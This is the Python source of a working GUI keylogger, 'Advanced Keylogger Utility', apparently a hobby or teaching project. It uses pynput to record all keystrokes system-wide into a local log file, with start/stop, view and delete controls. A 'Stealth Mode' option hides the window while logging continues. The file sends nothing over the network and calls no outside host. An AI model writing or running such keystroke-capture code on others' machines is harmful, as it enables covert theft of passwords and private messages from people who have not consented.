import threading
import sys
import os
import subprocess
import time 
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from pynput import keyboard 

# Attempt to import ThemedTk for better aesthetics
try:
    from ttkthemes import ThemedTk 
except ImportError:
    # Fallback to standard Tkinter if ttkthemes is not installed
    ThemedTk = tk.Tk

# --- Global Configuration ---
LOG_FILE = "keylog.txt"

class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        master.title("🕵️Advanced Keylogger Utility")
        master.geometry("750x260")
        master.resizable(True, True)
        
        # Core keylogger variables
        self.key_listener = None
        self.is_running = False

        self.setup_styles()
        self.setup_widgets()
        
        # Override the window close behavior
        master.protocol("WM_DELETE_WINDOW", self.on_close)
        self.update_status("System Initialized. Ready to secure.", "Black")

    def setup_styles(self):
        """Configure advanced ttk styles and apply a clean theme."""
        style = ttk.Style()
        
        # Custom styles for the modern 'superhero' theme
        style.configure('Start.TButton', background='#17a2b8', foreground='white', font=('Arial', 12, 'bold')) # Info/Cyan
        style.configure('Stop.TButton', background='#dc3545', foreground='white', font=('Arial', 12, 'bold')) # Danger/Red
        style.configure('Manage.TButton', background='#6c757d', foreground='white', font=('Arial', 11)) # Secondary/Gray
        
        # Ensure text is visible on the dark theme background
        style.configure('TLabel', foreground='white', padding=5)

    def setup_widgets(self):
        """Creates and places all GUI elements with enhanced layout."""
        
        # --- 1. Status Display Frame ---
        status_frame = ttk.Frame(self.master, padding="15 10 15 5")
        status_frame.pack(fill='x')
        
        self.status_label = ttk.Label(status_frame, 
                                      text="Status", 
                                      font=("Consolas", 16, "bold"), 
                                      anchor=tk.CENTER)
        self.status_label.pack(fill='x')
        
        # Dynamic Visual Feedback (Progress Bar)
        self.progress_bar = ttk.Progressbar(status_frame, orient='horizontal', length=500, mode='indeterminate')
        self.progress_bar.pack(pady=5)
        
        ttk.Separator(self.master, orient=tk.HORIZONTAL).pack(fill='x', padx=15, pady=5)
        
        # --- 2. Control Button Frame ---
        control_frame = ttk.Frame(self.master, padding="15 5 15 5")
        control_frame.pack(pady=10)

        self.start_btn = ttk.Button(control_frame, 
                                    text="▶️ ACTIVATE LOGGER", 
                                    command=self.start_keylogger_thread, 
                                    width=22, 
                                    style='Start.TButton')
        self.start_btn.pack(side=tk.LEFT, padx=15)

        self.stop_btn = ttk.Button(control_frame, 
                                   text="⏹️ SUSPEND LOGGER", 
                                   command=self.stop_keylogger_thread, 
                                   width=22,
                                   style='Stop.TButton')
        self.stop_btn.pack(side=tk.LEFT, padx=15)
        self.stop_btn.state(['disabled']) # Start disabled
        self.start_btn.state(['!disabled']) # Start enabled

        ttk.Separator(self.master, orient=tk.HORIZONTAL).pack(fill='x', padx=15, pady=5)

        # --- 3. Management Button Frame ---
        management_frame = ttk.Frame(self.master, padding="15 5 15 5")
        management_frame.pack(pady=5)

        # View Log Button
        self.view_btn = ttk.Button(management_frame, 
                                   text="📄 View Log", 
                                   command=self.view_log_file, 
                                   width=16, 
                                   style='Manage.TButton')
        self.view_btn.pack(side=tk.LEFT, padx=8)
        
        # Clear Log Button 
        self.clear_btn = ttk.Button(management_frame, 
                                    text="🗑️ Clear Log", 
                                    command=self.clear_log_file, 
                                    width=16, 
                                    style='Manage.TButton')
        self.clear_btn.pack(side=tk.LEFT, padx=8)
        
        # Background Button 
        self.bg_btn = ttk.Button(management_frame, 
                                   text="⬇️ Background", 
                                   command=self.minimize_to_background, 
                                   width=16, 
                                   style='Manage.TButton')
        self.bg_btn.pack(side=tk.LEFT, padx=8)
        
    def update_status(self, message, color="white"):
        """Updates the status label in the GUI."""
        self.status_label.config(text=message, foreground=color)

    # --- Core Keylogger Logic ---
    
    def on_press(self, key):
        """Logs keys with improved formatting."""
        try:
            key_data = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                key_data = '[SPACE]'
            elif key == keyboard.Key.enter:
                key_data = '\n[ENTER]\n'
            elif key == keyboard.Key.tab:
                key_data = '[TAB]'
            elif key == keyboard.Key.backspace:
                key_data = '[BACKSPACE]'
            else:
                key_data = f'[{str(key).split(".")[-1].upper()}]'

        with open(LOG_FILE, "a") as f:
            f.write(key_data)


    def start_keylogger_thread(self):
        """Starts the keylogger in a separate thread."""
        if self.is_running:
            messagebox.showwarning("Status", "Logger is already ACTIVE.")
            return

        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            with open(LOG_FILE, "a") as f:
                f.write(f"\n\n{'='*40}\n")
                f.write(f"--- NEW SESSION STARTED: {timestamp} ---\n")
                f.write(f"{'='*40}\n")

            self.key_listener = keyboard.Listener(on_press=self.on_press)
            self.key_listener.start()
            self.is_running = True
            
            # Start visual indicator and update buttons
            self.progress_bar.start(10) 
            self.update_status("🔴 LOGGING ACTIVE | Monitoring Keystrokes...", "#ff6347") # Tomato red
            self.start_btn.state(['disabled'])
            self.stop_btn.state(['!disabled'])
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start keylogger: {e}")
            self.update_status("Failed to start keylogger", "red")

    def stop_keylogger_thread(self):
        """Stops the keylogger thread gracefully."""
        if not self.is_running or self.key_listener is None:
            messagebox.showwarning("Status", "Logger is currently SUSPENDED.")
            return

        try:
            self.key_listener.stop()
            self.key_listener.join()
            self.key_listener = None
            self.is_running = False
            
            # Stop visual indicator and update buttons
            self.progress_bar.stop() 
            self.update_status(f"🟢 LOGGING SUSPENDED | Log saved in '{LOG_FILE}'.", "#32cd32") # Lime green
            self.start_btn.state(['!disabled'])
            self.stop_btn.state(['disabled'])
            messagebox.showinfo("Status", "Keylogger suspended successfully.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop keylogger: {e}")
            self.update_status("Failed to stop keylogger", "red")

    # --- Utility Functions ---

    def view_log_file(self):
        """Opens the log file in a new window using the system's default viewer."""
        self.update_status("Attempting to open log file externally...", "gray")

        if not os.path.exists(LOG_FILE):
            messagebox.showwarning("File Missing", f"File '{LOG_FILE}' does not exist.")
            self.update_status("Ready", "white")
            return

        try:
            if sys.platform.startswith('darwin'):
                subprocess.Popen(['open', LOG_FILE])
            elif sys.platform.startswith('win32'):
                subprocess.Popen(['start', LOG_FILE], shell=True) 
            elif sys.platform.startswith('linux'):
                subprocess.Popen(['xdg-open', LOG_FILE])
            else:
                messagebox.showinfo("Info", f"Cannot open file. Open '{LOG_FILE}' manually.")
            
            messagebox.showinfo("Log Viewer", "External file viewer launched successfully.")
        except Exception as e:
            messagebox.showerror("Error", f"Could not launch file viewer: {e}")
        
        self.update_status("Ready", "white")

    def clear_log_file(self):
        """Deletes the log file after confirmation."""
        if not os.path.exists(LOG_FILE):
            messagebox.showinfo("Log File", f"File '{LOG_FILE}' does not exist.")
            return

        if self.is_running:
            messagebox.showwarning("Warning", "Stop the logger before clearing the log.")
            return
            
        if messagebox.askyesno("Confirm Clear", "PERMANENTLY delete the current log file?"):
            try:
                os.remove(LOG_FILE)
                self.update_status("Log file DELETED.", "yellow")
                messagebox.showinfo("Success", "Log file was successfully deleted.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete log file: {e}")
                self.update_status("Ready", "white")

    def minimize_to_background(self):
        """Hides the main window, allowing the logger to run discreetly."""
        if self.is_running:
            self.master.withdraw() # Hide the window
            self.update_status("Stealth Mode: Logger Running in Background (Check Taskbar)", "yellow")
            messagebox.showinfo("Background Mode", "Logger is running in the background. Check your taskbar/system tray to restore.")
        else:
            messagebox.showwarning("Warning", "Logger must be ACTIVE to run in the background.")
            
    def on_close(self):
        """Handles the window close event (X button)."""
        if self.is_running:
            # Offer to minimize to background instead of closing
            if messagebox.askyesno("Confirm Exit/Background", "The logger is active. Would you like to STOP it and EXIT, or just run it in the BACKGROUND? \n\n'Yes' = Stop and Exit\n'No' = Run in Background (Minimize)"):
                self.stop_keylogger_thread()
                self.master.destroy()
            else:
                self.minimize_to_background()
        else:
            self.master.destroy()

# --- Main Execution ---

if __name__ == "__main__":
    try:
        # Use ThemedTk and 'superhero' for a modern, bold dark look
        root = ThemedTk(theme="superhero") 
    except NameError:
        root = tk.Tk()
        
    app = KeyloggerApp(root)
    root.mainloop()